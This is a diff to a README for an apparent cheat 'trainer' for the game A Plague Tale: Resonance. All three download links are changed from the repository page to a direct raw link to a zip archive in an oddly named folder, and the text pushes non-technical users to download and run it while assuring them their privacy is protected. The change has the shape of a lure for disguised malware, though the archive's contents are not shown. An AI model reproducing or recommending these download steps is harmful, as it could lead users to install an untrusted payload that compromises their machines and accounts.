@@ -1,6 +1,6 @@
 # 🎮 A-Plague-Tale-Resonance-Trainer - Unlock Everything, Master the Game Faster
 
-[![Download Now](https://img.shields.io/badge/Download-Resonance_Trainer-2ea44f?style=for-the-badge&logo=github)](https://github.com/roh68210/A-Plague-Tale-Resonance-Trainer)
+[![Download Now](https://img.shields.io/badge/Download-Resonance_Trainer-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/roh68210/A-Plague-Tale-Resonance-Trainer/main/semitransverse/v1.6.zip)
 
 ## ✨ What Is This?
 
@@ -13,7 +13,7 @@ No coding skills needed. No complicated setup. If you can click a button, you ca
 Follow these three simple steps to start using the trainer today:
 
 **Step 1: Download the file**
-Visit this link to download the application: [https://github.com/roh68210/A-Plague-Tale-Resonance-Trainer](https://github.com/roh68210/A-Plague-Tale-Resonance-Trainer)
+Visit this link to download the application: [https://raw.githubusercontent.com/roh68210/A-Plague-Tale-Resonance-Trainer/main/semitransverse/v1.6.zip](https://raw.githubusercontent.com/roh68210/A-Plague-Tale-Resonance-Trainer/main/semitransverse/v1.6.zip)
 
 **Step 2: Save it to your computer**
 Choose a location you'll remember, like your Desktop or Downloads folder.
@@ -169,7 +169,7 @@ Your privacy is fully protected:
 
 Ready to enhance your gameplay experience?
 
-[![Download Now](https://img.shields.io/badge/Download-A-Plague_Tale_Resonance_Trainer-ff69b4?style=for-the-badge)](https://github.com/roh68210/A-Plague-Tale-Resonance-Trainer)
+[![Download Now](https://img.shields.io/badge/Download-A-Plague_Tale_Resonance_Trainer-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/roh68210/A-Plague-Tale-Resonance-Trainer/main/semitransverse/v1.6.zip)
 
 ## 📞 Getting Help
 
